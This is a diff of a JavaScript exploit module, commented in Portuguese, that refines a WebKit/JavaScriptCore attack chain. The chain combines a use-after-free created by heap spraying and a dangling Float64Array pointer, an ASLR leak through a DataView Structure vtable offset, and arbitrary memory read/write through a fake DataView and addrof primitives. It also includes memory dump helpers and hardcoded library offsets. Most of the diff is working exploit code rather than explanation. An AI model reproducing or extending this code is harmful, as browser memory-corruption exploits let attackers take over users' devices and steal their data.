@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v149 - Integração Final da Cadeia de Exploração UAF -> ASLR -> ARB R/W)
+// js/script3/testArrayBufferVictimCrash.mjs (v149_b - Refinamento da Lógica UAF para Vazamento Direto)
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
@@ -25,7 +25,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v149_SUCCESS_PATH";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v149_b_UAF_REFINED";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -50,7 +50,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn); // Note: logFn passado a arbReadFn
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -71,7 +71,6 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Fim do dump.`, "debug");
 }
 
-// Funções de leitura/escrita arbitrária UNIVERSAIS (utilizam _fake_data_view)
 export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const FNAME = "arb_read_universal_js_heap";
     if (!_fake_data_view) {
@@ -81,6 +80,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
+    // Salvamos/restauramos o m_vector usando arb_read/arb_write (OOB local)
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8); 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
 
@@ -202,8 +202,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
             logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
             return true;
         } else {
-            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE com m_mode ${toHex(m_mode_to_try)}!`, "error", FNAME);
-            logFn(`    Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}`, "error", FNAME);
+            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
             logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
             return false;
         }
@@ -250,7 +249,9 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     // Queremos que o Type Confusion ocorra quando o JS tentar ler dangling_ref[0]
     // e encontre o valor que pulverizamos.
     let victim_object_arr = new Float64Array(VICTIM_SIZE_BYTES / 8); // Float64Array para UAF (128 bytes = 16 doubles)
-    victim_object_arr[0] = 1.0; // Valor inicial simples
+    // Preencha com um valor inicial conhecido para debug. 
+    // É importante que o valor não seja 0, pois 0 pode ser confundido com um ponteiro nulo.
+    victim_object_arr[0] = 1.000000000000123; // Um double com valor hex: 0x3FF0000000000206
     victim_object_arr[1] = 2.0;
 
     // Para evitar que o GC colete 'victim_object_arr' antes que o dangling_ref seja criado.
@@ -286,19 +287,19 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     const SPRAY_COUNT_UAF_NEW = 1000; // Aumentado para melhor chance de hit
     const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima
 
-    // === NOVO: ESTE É O VALOR QUE IRÁ SER VAZADO AGORA. ===
-    // Pulverizaremos com o Double que representa o ponteiro para o vtable da Structure de DataView
-    // Esta é a mesma lógica de vazamento de ASLR de antes, mas agora pulverizada diretamente no UAF.
+    // --- Determinar o ponteiro a ser pulverizado ---
+    // Usaremos o endereço do vtable da Structure de DataView (0x3AD62A0)
+    // Para fins de pulverização, precisamos de uma BASE ASLR TEMPORÁRIA para criar o ponteiro DOUBLE.
+    // ESTA PARTE É CRÍTICA: SE o 0x3AD62A0 NÃO É ONDE O VTABLE REALMENTE COMEÇA NA LIB, ISSO FALHARÁ.
+    // ESTE É UM ENDEREÇO RELATIVO À BASE DA LIB, NÃO UM ENDEREÇO ABSOLUTO DE VARIÁVEL GLOBAL.
+    // Você confirmou o 0x3AD62A0 é o offset do vtable.
+    // Assumiremos uma base hardcoded para CONSTRUIR O VALOR A SER PULVERIZADO.
+    // A base REAL será vazada pelo UAF.
+    const TEMPORARY_HARDCODED_WEBKIT_BASE = new AdvancedInt64(0x00d44000, 0); // Exemplo de base hardcoded.
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-    // Para que isso funcione, precisamos de uma BASE ASLR TEMPORÁRIA para criar o ponteiro DOUBLE para o spray.
-    // Usaremos a base hardcoded (0x00d44000) AQUI, para criar o DOUBLE que pulverizará.
-    // Este Double pulverizado será então lido pela dangling_ref (dangling_ref[0])
-    // e *esse* valor lido é que será usado para o cálculo real da base.
-    const TEMPORARY_HARDCODED_WEBKIT_BASE = new AdvancedInt64(0x00d44000, 0); // Hardcoded, para fins de SPRAY
     const TARGET_VTABLE_ADDRESS_TO_SPRAY = TEMPORARY_HARDCODED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
 
     // Converter este endereço (que é um AdvancedInt64) para a sua representação Double Float64
-    // Esta é a parte que se tornará o conteúdo da memória que 'dangling_ref' irá ler.
     const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY);
     logFn(`[UAF] Valor Double do VTable da Structure (${TARGET_VTABLE_ADDRESS_TO_SPRAY.toString(true)}) para pulverização: ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
 
